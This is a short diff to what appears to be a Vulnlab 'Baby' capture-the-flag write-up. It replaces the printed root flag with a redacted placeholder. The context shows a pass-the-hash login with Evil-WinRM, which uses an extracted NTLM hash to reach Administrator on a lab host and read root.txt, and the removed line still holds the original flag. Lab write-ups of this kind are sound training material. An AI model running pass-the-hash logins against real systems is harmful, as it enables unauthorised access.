@@ -555,7 +555,7 @@ Used **Evil-WinRM** to connect as Administrator using the extracted NTLM hash 
 ```
 destiny@falcon:~/vulnlab.com/Baby-W$ evil-winrm -i 10.10.70.114 -u "administrator" -H "ee4457ae59f1e3fbd764e33d9cef123d"
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
-VL{9000cab96bcf62e99073ff5f6653ce90}
+VL{<REDACTED>}
 ```
 
 ---
